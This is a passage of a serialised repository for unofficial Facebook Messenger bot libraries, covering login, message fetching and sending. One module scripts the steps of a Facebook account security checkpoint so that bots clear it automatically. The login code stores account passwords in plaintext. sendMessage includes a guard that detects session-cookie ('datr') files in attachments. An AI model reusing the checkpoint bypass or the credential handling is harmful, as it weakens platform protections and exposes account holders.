'default',verticalLayout: 'default',width: 0,whitespaceBreak: true }));\n    console.log(chalk.bold.hex('#9900FF')(\"[</>]\") + chalk.bold.yellow(' => ') + \"Operating System: \" + chalk.bold.red(os.type()));\n    console.log(chalk.bold.hex('#9900FF')(\"[</>]\") + chalk.bold.yellow(' => ') + \"Machine Version: \" + chalk.bold.red(os.version()));\n    console.log(chalk.bold.hex('#9900FF')(\"[</>]\") + chalk.bold.yellow(' => ') + \"Fca Version: \" + chalk.bold.red(global.Fca.Version) + '\\n');\n    try {\n        rl.question(Language.TypeAccount, (Account) => {\n            if (!Account.includes(\"@\") && global.Fca.Require.utils.getType(parseInt(Account)) != \"Number\") return logger.Normal(Language.TypeAccountError, function () { process.exit(1) }); //Very Human\n                else rl.question(Language.TypePassword, function (Password) {\n                    rl.close();\n                    try {\n                        Database().set(\"Account\", Account);\n                        Database().set(\"Password\", Password);\n                    }\n                    catch (e) {\n                        logger.Warning(Language.ErrDataBase);\n                            logger.Error();\n                        process.exit(0);\n                    }\n                    if (global.Fca.Require.FastConfig.ResetDataLogin) {\n                        global.Fca.Require.FastConfig.ResetDataLogin = false;\n                        global.Fca.Require.fs.writeFileSync(process.cwd() + '/FastConfigFca.json', JSON.stringify(global.Fca.Require.FastConfig, null, 4));\n                    }\n                logger.Success(Language.SuccessSetData);\n                process.exit(1);\n            });\n        })\n    }\n    catch (e) {\n        logger.Error(e)\n    }\n}\n\n/**\n * @param {{ email: any; password: any; appState: any; }} loginData\n * @param {{}} options\n * @param {(error: any, api: any) => any} callback\n */\n\nfunction login(loginData, options, callback) {\n    if (utils.getType(options) === 'Function' || utils.getType(options) === 'AsyncFunction') {\n        callback = options;\n        options = {};\n    }\n\n    var globalOptions = {\n        selfListen: false,\n        listenEvents: true,\n        listenTyping: false,\n        updatePresence: false,\n        forceLogin: false,\n        autoMarkDelivery: false,\n        autoMarkRead: false,\n        autoReconnect: true,\n        logRecordSize: 100,\n        online: false,\n        emitReady: false,\n        userAgent: \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8\"\n    };\n    \n    var prCallback = null;\n    if (utils.getType(callback) !== \"Function\" && utils.getType(callback) !== \"AsyncFunction\") {\n        var rejectFunc = null;\n        var resolveFunc = null;\n        var returnPromise = new Promise(function(resolve, reject) {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        }); \n        prCallback = function(error, api) {\n            if (error) return rejectFunc(error);\n            return resolveFunc(api);\n        };\n        callback = prCallback;\n    }\n\n    if (loginData.email && loginData.password) {\n        setOptions(globalOptions, {\n            logLevel: \"silent\",\n            forceLogin: true,\n            userAgent: \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36\"\n        });\n        loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);\n    }\n  else if (loginData.appState) {\n        setOptions(globalOptions, options);\n        let All = (getAll()).filter(i => i.data !== null);\n            All = All.filter(i => i.data.messageCount !== undefined)\n            if (All.length >= 1) {\n                deleteAll(All.map(obj => obj.data.threadID));\n            }\n        /*\n        if (global.Fca.Require.FastConfig.Websocket_Extension.Status) {\n            const UserName = Database().get('Ws_UserName');\n            const PassWord = Database().get(\"Ws_PassWord\");\n            if (!UserName || !PassWord || global.Fca.Require.FastConfig.Websocket_Extension.ResetData) {\n                const question = question => {\n                    const rl = readline.createInterface({\n                        input: process.stdin,\n                        output: process.stdout\n                    });\n                    var done,answ;\n                        rl.question(question, answer => {\n                            rl.close();\n                            answ = answer;\n                            done = true\n                        })\n                        deasync.loopWhile(function(){\n                            return !done;\n                        });\n                    return answ;\n                };\n                console.clear();\n                console.log(figlet.textSync('Horizon', {font: 'ANSI Shadow',horizontalLayout: 'default',verticalLayout: 'default',width: 0,whitespaceBreak: true }));\n                console.log(chalk.bold.hex('#9900FF')(\"[</>]\") + chalk.bold.yellow(' => ') + \"Operating System: \" + chalk.bold.red(os.type()));\n                console.log(chalk.bold.hex('#9900FF')(\"[</>]\") + chalk.bold.yellow(' => ') + \"Machine Version: \" + chalk.bold.red(os.version()));\n                console.log(chalk.bold.hex('#9900FF')(\"[</>]\") + chalk.bold.yellow(' => ') + \"Fca Version: \" + chalk.bold.red(global.Fca.Version) + '\\n');\n                const UserName = question(Language.Ws_TypeUserName);\n                const PassWord = question(Language.Ws_TypePassWord);\n                if (!UserName || !PassWord) {\n                    logger.Warning(\"Dangerous action detected! Proceeding to automatically disable websocket_extension.\");\n                    global.Fca.Require.FastConfig.Websocket_Extension.Status = false;\n                    global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(global.Fca.Require.FastConfig, null, \"\\t\"));\n                }\n                else {\n                    try {\n                        Database().set('Ws_UserName', UserName);\n                        Database().set('Ws_PassWord', PassWord);\n                        logger.Success(Language.Ws_Success, function() {\n                            const speakeasy = require('speakeasy');\n                            const secret = (speakeasy.generateSecret({ length: 20 }));\n                            logger.Warning(getText(Language.Ws_2Fa, secret.base32))\n                            Database().set('Ws_2Fa', secret.base32); \n                            if (global.Fca.Require.FastConfig.Websocket_Extension.ResetData) {\n                                global.Fca.Require.FastConfig.Websocket_Extension.ResetData = false;\n                                global.Fca.Require.fs.writeFileSync(process.cwd() + '/FastConfigFca.json', JSON.stringify(global.Fca.Require.FastConfig, null, 4));\n                            }\n                            question(\"Enter To Continue!\");\n                            const ask = function() {\n                                const TFa_Check = question(Language.Ws_2Fa_Check)\n                                if (TFa_Check != speakeasy.totp({\n                                    secret: secret.base32,\n                                    encoding: 'base32'\n                                })) {\n                                    logger.Warning(\"M√£ Kh√¥ng ƒê√∫ng vui l√≤ng nh·∫≠p l·∫°i(Incorrect code, please enter again.)\")\n                                    ask();\n                                }\n                                else {\n                                    logger.Success(\"Success!\");\n                                    process.exit(1);\n                                }\n                            }\n                            return ask();\n                        });\n                    }\n                    catch (e) {\n                        console.log(e)\n                        logger.Warning(\"Error, auto turn off Websocket_extension\");\n                        global.Fca.Require.FastConfig.Websocket_Extension.Status = false;\n                        global.Fca.Require.fs.writeFileSync(process.cwd() + \"/FastConfigFca.json\", JSON.stringify(global.Fca.Require.FastConfig, null, \"\\t\"));\n                        process.exit(1);\n                    }\n                }\n            }\n        }\n**/\n        switch (global.Fca.Require.FastConfig.AutoLogin) {\n            case true: {\n                if (global.Fca.Require.FastConfig.ResetDataLogin) return setUserNameAndPassWord();\n                else {\n                    try {\n                        const TempState = Database().get(\"TempState\")\n                        if (TempState) { \n                            try {\n                                loginData.appState = JSON.parse(TempState);\n                            }\n                            catch (_) {\n                                loginData.appState = TempState;\n                            }\n                            Database().delete(\"TempState\");\n                        }\n                    }\n                    catch (e) {\n                        console.log(e)\n                        Database().delete(\"TempState\");\n                            logger.Warning(Language.ErrDataBase);\n                            logger.Error();\n                        process.exit(0);\n                    }\n                    try {\n                        if (Database().has('Account') && Database().has('Password')) return loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);\n                        else return setUserNameAndPassWord();\n                    }\n                    catch (e) {\n                        console.log(e)\n                        logger.Warning(Language.ErrDataBase);\n                            logger.Error();\n                        process.exit(0);\n                    }\n                }\n            }\n            case false: {\n                return loginHelper(loginData.appState, loginData.email, loginData.password, globalOptions, callback, prCallback);\n            }\n        }\n    }\n    return returnPromise;\n}\n\nmodule.exports = login;","path":null,"size_bytes":76316,"size_tokens":null},"lib/fca-auto/Extra/Bypass/956/index.js":{"content":"/** By @KanzuWakazaki 03/05/2024 - DD/MM/YYYY */\n// !Type - change password is not required\nfunction Find_And_Parse(Data) {\n    const regex = /<script\\s+type=\"application\\/json\"\\s+data-content-len=\"([0-9]+)\"\\s+data-sjs\\s*(.*?)\\s*<\\/script>/gs;\n    const matches = Data.matchAll(regex);\n    let Data_resp;\n    for (const match of matches) {\n        if (JSON.parse(JSON.stringify((match[2]))).includes('any_eligible_challenges')) {\n            const Data_ = JSON.parse(match[2].replace('>', ''))\n            Data_resp = findAnyEligibleChallengesAndSiblings(Data_)\n        }\n\n    }\n    \n    \n    function findAnyEligibleChallengesAndSiblings(data) {\n        const screenData = findScreenData(data);\n        if (!screenData) {\n            return null;\n        }\n    \n        const siblings = {};\n        for (const [key, value] of Object.entries(screenData)) {\n            if (key === 'any_eligible_challenges') {\n                siblings[key] = value;\n            } \n            else {\n                siblings[key] = value;\n            }\n        }\n    \n        return siblings;\n    }\n    \n    function findScreenData(data) {\n        if (Array.isArray(data)) {\n            for (const item of data) {\n                const result = findScreenData(item);\n                if (result) {\n                    return result;\n                }\n            }\n        } \n        else if (typeof data === 'object' && data !== null) {\n            if (data.screen) {\n                return data.screen;\n            }\n            for (const value of Object.values(data)) {\n                const result = findScreenData(value);\n                if (result) {\n                    return result;\n                }\n            }\n        }\n        return null;\n    }    \n    return Data_resp.token || null\n}\n\nmodule.exports.Check = Find_And_Parse\nmodule.exports.Cook_And_Work = async function(ctx, defaultFuncs) {\n    const utils = require('../../../utils');\n    var Form_P1;\n    var CanResolve_P1;\n    var NextToken_P1;\n    var lsd;\n\n    const Level_1 = () => new Promise((re, rj) => {\n        try {\n            utils.get('https://www.facebook.com/checkpoint/828281030927956/?next=https%3A%2F%2Faccountscenter.facebook.com%2Fpassword_and_security', ctx.jar, null, ctx.globalOptions)\n            .then(function(data) {\n                lsd = utils.getFrom(data.body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\")\n                Form_P1 = {\n                    lsd: lsd,\n                    fb_api_caller_class: 'RelayModern',\n                    fb_api_req_friendly_name: 'useEpsilonNavigateMutation',\n                    variables: JSON.stringify({\n                        input:{\n                            client_mutation_id:\"1\",\n                            actor_id: ctx.userId,\n                            step:\"STEPPER_CONFIRMATION\",\n                            token : JSON.stringify({\n                                sensitive_string_value: Find_And_Parse(data.body)\n                            })\n                        },\n                        scale:1\n                    }),\n                    server_timestamps: true,\n                    doc_id: 7414856831926043\n                };\n            })\n            .then(function() {\n                defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P1, {}) \n                .then(function(resp) {\n                    let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n                    if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonStepperScreen\" && checkpoint.screen.next_screen == 'CONTACT_POINT_REVIEW' && checkpoint.screen.steps.length === 3 && checkpoint.screen.steps[1].active == true) {\n                        NextToken_P1 = checkpoint.screen.token;    \n                        CanResolve_P1 = true;\n                        re(CanResolve_P1)\n                    }\n                    else {\n                        CanResolve_P1 = false; \n                        re(CanResolve_P1)\n                    }\n                });\n            })\n        }\n        catch (e) {\n            rj(e);\n        }\n    })\n\n    await Level_1();\n\n    var CanResolve_P2;\n    var NextToken_P2;\n\n    const Level_2 = () => new Promise((re, rj) => {\n        let Form_P2 = {\n            doc_id: 7414856831926043,\n            lsd: lsd,\n            fb_api_caller_class: \"RelayModern\",\n            fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n            server_timestamps: true,\n            variables: JSON.stringify({\n                input: {\n                    client_mutation_id: 2,\n                    actor_id: ctx.userId,\n                    step:\"CONTACT_POINT_REVIEW\",\n                    token: JSON.stringify({\n                        sensitive_string_value: NextToken_P1\n                    })\n                },\n                scale: 1\n            })\n        }\n        \n        defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P2, {}).then(function(resp) {\n            let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n            if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonContactPointReview\" && checkpoint.screen.contact_points.length >= 1 && checkpoint.screen.contact_points[0].suspicious == \"UNSUSPICIOUS\") {\n                NextToken_P2 = checkpoint.screen.token;    \n                CanResolve_P2 = true;\n                re(CanResolve_P2)\n            }\n            else {\n                CanResolve_P2 = false; \n                re(CanResolve_P2)\n            }\n        });\n    })\n\n    if (CanResolve_P1 == true) await Level_2();\n    else return CanResolve_P1;\n\n    var CanResolve_P3;\n    var NextToken_P3;\n\n    const Level_3 = () => new Promise((re, rj) => {\n        let Form_P3 ={\n            doc_id: 7414856831926043,\n            lsd: lsd,\n            fb_api_caller_class: \"RelayModern\",\n            fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n            server_timestamps: true,\n            variables: JSON.stringify({\n                input: {\n                    client_mutation_id: 3,\n                    actor_id: ctx.userId,\n                    step: \"CHANGE_PASSWORD\", //bro where's change password :d?\n                    token: JSON.stringify({\n                        sensitive_string_value: NextToken_P2\n                    })\n                },\n                scale:1\n            })\n        }\n        \n        defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P3, {}).then(function(resp) {\n            let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n            if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonLoginDetailsConfirmationScreen\" && checkpoint.screen.contact_points.length >= 1) {\n                NextToken_P3 = checkpoint.screen.token;   \n                CanResolve_P3 = true; \n                re(CanResolve_P3) \n            }\n            else {\n                CanResolve_P3 = false;\n                rj(CanResolve_P3)\n            }\n        });\n    })\n\n    if (CanResolve_P2 == true) await Level_3();\n    else return CanResolve_P2\n    \n    var CanResolve_P4;\n    var NextToken_P4;\n\n    const Level_Final = () => new Promise((re, rj) => { \n        let Form_P4 ={\n            doc_id: 7414856831926043,\n            lsd: lsd,\n            fb_api_caller_class: \"RelayModern\",\n            fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n            server_timestamps: true,\n            variables: JSON.stringify({\n                input: {\n                    client_mutation_id: 4,\n                    actor_id: ctx.userId,\n                    step: \"OUTRO\",\n                    token: JSON.stringify({\n                        sensitive_string_value: NextToken_P3\n                    })\n                },\n                scale:1\n            })\n        }\n        \n        defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P4, {}).then(function(resp) {\n            let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n            if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonOutroScreen\" && checkpoint.screen.fallback.uri == 'https://www.facebook.com/') {\n                NextToken_P4 = checkpoint.screen.token;    \n                CanResolve_P4 = true;\n                re(CanResolve_P4)\n            }\n            else { \n                CanResolve_P4 = false;\n                re(CanResolve_P4)\n            }\n        });\n    });\n\n    if (CanResolve_P3 == true) return await Level_Final();\n    else return (CanResolve_P3);\n}","path":null,"size_bytes":8613,"size_tokens":null},"lib/fca-auto/src/getMessage.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n    return function getMessage(threadID, messageID, callback) {\n      if (!callback) {\n        //return callback({ error: \"getMessage: need callback\" });\n      }\n\n      if (!threadID || !messageID) {\n        return callback({ error: \"getMessage: need threadID and messageID\" });\n      }\n\n      const form = {\n        \"av\": ctx.userID,\n        \"queries\": JSON.stringify({\n          \"o0\": {\n            //This doc_id is valid as of ? (prob January 18, 2020)\n            \"doc_id\": \"1768656253222505\",\n            \"query_params\": {\n              \"thread_and_message_id\": {\n                \"thread_id\": threadID,\n                \"message_id\": messageID,\n              }\n            }\n          }\n        })\n      };\n\n      defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then((resData) => {\n        if (resData[resData.length - 1].error_results > 0) {\n          throw resData[0].o0.errors;\n        }\n\n        if (resData[resData.length - 1].successful_results === 0) {\n          throw { error: \"getMessage: there was no successful_results\", res: resData };\n        }\n\n        var fetchData = resData[0].o0.data.message;\n        console.log(resData)\n        if (fetchData) {\n          (!ctx.globalOptions.selfListen &&\n            fetchData.message_sender.id.toString() === ctx.userID) ||\n            !ctx.loggedIn ?\n            undefined :\n            (function () {\n              console.log( {\n                threadID: threadID,\n                messageID: fetchData.message_id,\n                senderID: fetchData.message_sender.id,\n                attachments: fetchData.blob_attachments.map(att => {\n                    var x;\n                    try {\n                        x = utils._formatAttachment(att);\n                    } catch (ex) {\n                        x = att;\n                        x.error = ex;\n                        x.type = \"unknown\";\n                    }\n                    return x;\n                }),\n                body: fetchData.message.text,\n                mentions: fetchData.message.ranges,\n                timestamp: fetchData.timestamp_precise,\n                messageReply: fetchData.replied_to_message,\n                raw: fetchData,\n            })\n              callback(null, {\n                threadID: threadID,\n                messageID: fetchData.message_id,\n                senderID: fetchData.message_sender.id,\n                attachments: fetchData.blob_attachments.map(att => {\n                    var x;\n                    try {\n                        x = utils._formatAttachment(att);\n                    } catch (ex) {\n                        x = att;\n                        x.error = ex;\n                        x.type = \"unknown\";\n                    }\n                    return x;\n                }),\n                body: fetchData.message.text,\n                mentions: fetchData.message.ranges,\n                timestamp: fetchData.timestamp_precise,\n                messageReply: fetchData.replied_to_message,\n                raw: fetchData,\n            }); })();\n        }\n    })\n    .catch((err) => {\n      log.error(\"getMessage\", err);\n      callback(err);\n    });\n\n  };\n}; ","path":null,"size_bytes":3417,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/sendMessage.js":{"content":"\"use strict\";\n\n/**\n * ƒê∆∞·ª£c Fix Hay L√†m M√†u B·ªüi: @HarryWakazaki\n * 21/4/2022\n*/\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\nvar bluebird = require(\"bluebird\");\nvar fs = require('fs-extra');\n\nvar allowedProperties = {\n  attachment: true,\n  url: true,\n  sticker: true,\n  emoji: true,\n  emojiSize: true,\n  body: true,\n  mentions: true,\n  location: true,\n};\n\nvar AntiText = \"Your criminal activity was detected while attempting to send an Appstate file\";\nvar Location_Stack;\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  function uploadAttachment(attachments, callback) {\n    var uploads = [];\n\n    // create an array of promises\n    for (var i = 0; i < attachments.length; i++) {\n      if (!utils.isReadableStream(attachments[i])) throw { error: \"Attachment should be a readable stream and not \" + utils.getType(attachments[i]) + \".\" };\n      var form = {\n        upload_1024: attachments[i],\n        voice_clip: \"true\"\n      };\n\n      uploads.push(\n        defaultFuncs\n          .postFormData(\"https://upload.facebook.com/ajax/mercury/upload.php\", ctx.jar, form, {})\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then(function (resData) {\n            if (resData.error) throw resData;\n            // We have to return the data unformatted unless we want to change it\n            // back in sendMessage.\n            return resData.payload.metadata[0];\n          })\n      );\n    }\n\n    // resolve all promises\n    bluebird\n      .all(uploads)\n      .then(resData => callback(null, resData)\n      )\n      .catch(function (err) {\n        log.error(\"uploadAttachment\", err);\n        return callback(err);\n      });\n  }\n\n  function getUrl(url, callback) {\n    var form = {\n      image_height: 960,\n      image_width: 960,\n      uri: url\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/message_share_attachment/fromURI/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) return callback(resData);\n        if (!resData.payload) return callback({ error: \"Invalid url\" });\n        callback(null, resData.payload.share_data.share_params);\n      })\n      .catch(function (err) {\n        log.error(\"getUrl\", err);\n        return callback(err);\n      });\n  }\n\n  function sendContent(form, threadID, isSingleUser, messageAndOTID, callback) {\n    // There are three cases here:\n    // 1. threadID is of type array, where we're starting a new group chat with users\n    //    specified in the array.\n    // 2. User is sending a message to a specific user.\n    // 3. No additional form params and the message goes to an existing group chat.\n    if (utils.getType(threadID) === \"Array\") {\n      for (var i = 0; i < threadID.length; i++) form[\"specific_to_list[\" + i + \"]\"] = \"fbid:\" + threadID[i];\n      form[\"specific_to_list[\" + threadID.length + \"]\"] = \"fbid:\" + ctx.userID;\n      form[\"client_thread_id\"] = \"root:\" + messageAndOTID;\n      log.info(\"sendMessage\", \"Sending message to multiple users: \" + threadID);\n    }\n    else {\n      // This means that threadID is the id of a user, and the chat\n      // is a single person chat\n      if (isSingleUser) {\n        form[\"specific_to_list[0]\"] = \"fbid:\" + threadID;\n        form[\"specific_to_list[1]\"] = \"fbid:\" + ctx.userID;\n        form[\"other_user_fbid\"] = threadID;\n      }\n      else form[\"thread_fbid\"] = threadID;\n    }\n\n    if (ctx.globalOptions.pageID) {\n      form[\"author\"] = \"fbid:\" + ctx.globalOptions.pageID;\n      form[\"specific_to_list[1]\"] = \"fbid:\" + ctx.globalOptions.pageID;\n      form[\"creator_info[creatorID]\"] = ctx.userID;\n      form[\"creator_info[creatorType]\"] = \"direct_admin\";\n      form[\"creator_info[labelType]\"] = \"sent_message\";\n      form[\"creator_info[pageID]\"] = ctx.globalOptions.pageID;\n      form[\"request_user_id\"] = ctx.globalOptions.pageID;\n      form[\"creator_info[profileURI]\"] = \"https://www.facebook.com/profile.php?id=\" + ctx.userID;\n    }\n\n    if (global.Fca.Require.FastConfig.AntiSendAppState == true) {\n      try {\n        if (Location_Stack != undefined || Location_Stack != null) {\n          let location =  (((Location_Stack).replace(\"Error\",'')).split('\\n')[7]).split(' ');\n          let format = {\n            Source: (location[6]).split('s:')[0].replace(\"(\",'') + 's',\n            Line:  (location[6]).split('s:')[1].replace(\")\",'')\n          };\n          form.body = AntiText + \"\\n- Source: \" + format.Source + \"\\n- Line: \" + format.Line;\n        }\n      }\n      catch (e) {}\n    }\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/send/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        Location_Stack = undefined;\n        if (!resData) return callback({ error: \"Send message failed.\" });\n        if (resData.error) {\n          if (resData.error === 1545012) log.warn(\"sendMessage\", \"Got error 1545012. This might mean that you're not part of the conversation \" + threadID);\n          return callback(resData);\n        }\n\n        var messageInfo = resData.payload.actions.reduce(function (p, v) {\n          return (\n            {\n              threadID: v.thread_fbid,\n              messageID: v.message_id,\n              timestamp: v.timestamp\n            } || p\n          );\n        }, null);\n        return callback(null, messageInfo);\n      })\n      .catch(function (err) {\n        log.error(\"sendMessage\", err);\n        if (utils.getType(err) == \"Object\" && err.error === \"Not logged in.\") ctx.loggedIn = false;\n        return callback(err,null);\n      });\n    }\n\n  function send(form, threadID, messageAndOTID, callback, isGroup) {\n//Full Fix sendMessage\n  if (utils.getType(threadID) === \"Array\") sendContent(form, threadID, false, messageAndOTID, callback);\n    else {\n      var THREADFIX = \"ThreadID\".replace(\"ThreadID\",threadID); // i c≈©ng ƒë√¥n n√¢u\n        if (THREADFIX.length <= 15 || global.Fca.isUser.includes(threadID)) sendContent(form, threadID, !isGroup, messageAndOTID, callback);\n        else if (THREADFIX.length >= 15 && THREADFIX.indexOf(1) != 0 || global.Fca.isThread.includes(threadID)) sendContent(form, threadID, threadID.length === 15, messageAndOTID, callback);\n        else {\n          if (global.Fca.Data.event.isGroup) {\n            sendContent(form, threadID, threadID.length === 15, messageAndOTID, callback);\n            global.Fca.isThread.push(threadID);\n          } \n          else {\n            sendContent(form, threadID, !isGroup, messageAndOTID, callback);\n            global.Fca.isUser.push(threadID);\n        }\n      }\n    }\n  }\n  \n  function handleUrl(msg, form, callback, cb) {\n    if (msg.url) {\n      form[\"shareable_attachment[share_type]\"] = \"100\";\n      getUrl(msg.url, function (err, params) {\n        if (err) return callback(err);\n        form[\"shareable_attachment[share_params]\"] = params;\n        cb();\n      });\n    }\n    else cb();\n  }\n\n  function handleLocation(msg, form, callback, cb) {\n    if (msg.location) {\n      if (msg.location.latitude == null || msg.location.longitude == null) return callback({ error: \"location property needs both latitude and longitude\" });\n      form[\"location_attachment[coordinates][latitude]\"] = msg.location.latitude;\n      form[\"location_attachment[coordinates][longitude]\"] = msg.location.longitude;\n      form[\"location_attachment[is_current_location]\"] = !!msg.location.current;\n    }\n    cb();\n  }\n\n  function handleSticker(msg, form, callback, cb) {\n    if (msg.sticker) form[\"sticker_id\"] = msg.sticker;\n    cb();\n  }\n\n  function handleEmoji(msg, form, callback, cb) {\n    if (msg.emojiSize != null && msg.emoji == null) return callback({ error: \"emoji property is empty\" });\n    if (msg.emoji) {\n      if (msg.emojiSize == null) msg.emojiSize = \"medium\";\n      if (msg.emojiSize != \"small\" && msg.emojiSize != \"medium\" && msg.emojiSize != \"large\") return callback({ error: \"emojiSize property is invalid\" });\n      if (form[\"body\"] != null && form[\"body\"] != \"\") return callback({ error: \"body is not empty\" });\n      form[\"body\"] = msg.emoji;\n      form[\"tags[0]\"] = \"hot_emoji_size:\" + msg.emojiSize;\n    }\n    cb();\n  }\n\n  function handleAttachment(msg, form, callback, cb) {\n    if (msg.attachment) {\n      form[\"image_ids\"] = [];\n      form[\"gif_ids\"] = [];\n      form[\"file_ids\"] = [];\n      form[\"video_ids\"] = [];\n      form[\"audio_ids\"] = [];\n\n      if (utils.getType(msg.attachment) !== \"Array\") msg.attachment = [msg.attachment];\n\n      const isValidAttachment = attachment => /_id$/.test(attachment[0]);\n\n      if (msg.attachment.every(isValidAttachment)) {\n        msg.attachment.forEach(attachment => form[`${attachment[0]}s`].push(attachment[1]));\n        return cb();\n      }\n\n      if (global.Fca.Require.FastConfig.AntiSendAppState) {\n        try {\n          const AllowList = [\".png\", \".mp3\", \".mp4\", \".wav\", \".gif\", \".jpg\", \".tff\"];\n          const CheckList = [\".json\", \".js\", \".txt\", \".docx\", '.php'];\n          var Has;\n          for (let i = 0; i < (msg.attachment).length; i++) {\n            if (utils.isReadableStream((msg.attachment)[i])) {\n              var path = (msg.attachment)[i].path != undefined ? (msg.attachment)[i].path : \"nonpath\";\n              if (AllowList.some(i => path.includes(i))) continue;\n              else if (CheckList.some(i => path.includes(i))) {\n                let data = fs.readFileSync(path, 'utf-8');\n                if (data.includes(\"datr\")) {\n                  Has = true;\n                  var err = new Error();\n                  Location_Stack = err.stack;\n                }\n                else continue;\n              }\n            }\n          }\n          if (Has == true) {\n            msg.attachment = [fs.createReadStream(__dirname + \"/../Extra/Src/Image/checkmate.jpg\")];\n          }    \n        }\n        catch (e) {}\n      }\n      uploadAttachment(msg.attachment, function (err, files) {\n      if (err) return callback(err);\n        files.forEach(function (file) {\n          var key = Object.keys(file);\n          var type = key[0]; // image_id, file_id, etc\n          form[\"\" + type + \"s\"].push(file[type]); // push the id\n        });\n        cb();\n      });\n    }\n    else cb();\n  }\n\n  function handleMention(msg, form, callback, cb) {\n    if (msg.mentions) {\n      for (let i = 0; i < msg.mentions.length; i++) {\n        const mention = msg.mentions[i];\n        const tag = mention.tag;\n        if (typeof tag !== \"string\") return callback({ error: \"Mention tags must be strings.\" });\n        const offset = msg.body.indexOf(tag, mention.fromIndex || 0);\n        if (offset < 0) log.warn(\"handleMention\", 'Mention for \"' + tag + '\" not found in message string.');\n        if (mention.id == null) log.warn(\"handleMention\", \"Mention id should be non-null.\");\n\n        const id = mention.id || 0;\n        const emptyChar = '\\u200E';\n        form[\"body\"] = emptyChar + msg.body;\n        form[\"profile_xmd[\" + i + \"][offset]\"] = offset + 1;\n        form[\"profile_xmd[\" + i + \"][length]\"] = tag.length;\n        form[\"profile_xmd[\" + i + \"][id]\"] = id;\n        form[\"profile_xmd[\" + i + \"][type]\"] = \"p\";\n      }\n    }\n    cb();\n  }\n\n  return function sendMessage(msg, threadID, callback, replyToMessage, isGroup) {\n    typeof isGroup == \"undefined\" ? isGroup = null : \"\";\n    if (!callback && (utils.getType(threadID) === \"Function\" || utils.getType(threadID) === \"AsyncFunction\")) return threadID({ error: \"Pass a threadID as a second argument.\" });\n    if (!replyToMessage && utils.getType(callback) === \"String\") {\n      replyToMessage = callback;\n      callback = function () { };\n    }\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var msgType = utils.getType(msg);\n    var threadIDType = utils.getType(threadID);\n    var messageIDType = utils.getType(replyToMessage);\n\n    if (msgType !== \"String\" && msgType !== \"Object\") return callback({ error: \"Message should be of type string or object and not \" + msgType + \".\" });\n\n    // Changing this to accomodate an array of users\n    if (threadIDType !== \"Array\" && threadIDType !== \"Number\" && threadIDType !== \"String\") return callback({ error: \"ThreadID should be of type number, string, or array and not \" + threadIDType + \".\" });\n\n    if (replyToMessage && messageIDType !== 'String') return callback({ error: \"MessageID should be of type string and not \" + threadIDType + \".\" });\n\n    if (msgType === \"String\") msg = { body: msg };\n    var disallowedProperties = Object.keys(msg).filter(prop => !allowedProperties[prop]);\n    if (disallowedProperties.length > 0) return callback({ error: \"Dissallowed props: `\" + disallowedProperties.join(\", \") + \"`\" });\n\n    var messageAndOTID = utils.generateOfflineThreadingID();\n\n    var form = {\n      client: \"mercury\",\n      action_type: \"ma-type:user-generated-message\",\n      author: \"fbid:\" + ctx.userID,\n      timestamp: Date.now(),\n      timestamp_absolute: \"Today\",\n      timestamp_relative: utils.generateTimestampRelative(),\n      timestamp_time_passed: \"0\",\n      is_unread: false,\n      is_cleared: false,\n      is_forward: false,\n      is_filtered_content: false,\n      is_filtered_content_bh: false,\n      is_filtered_content_account: false,\n      is_filtered_content_quasar: false,\n      is_filtered_content_invalid_app: false,\n      is_spoof_warning: false,\n      source: \"source:chat:web\",\n      \"source_tags[0]\": \"source:chat\",\n      body: msg.body ? 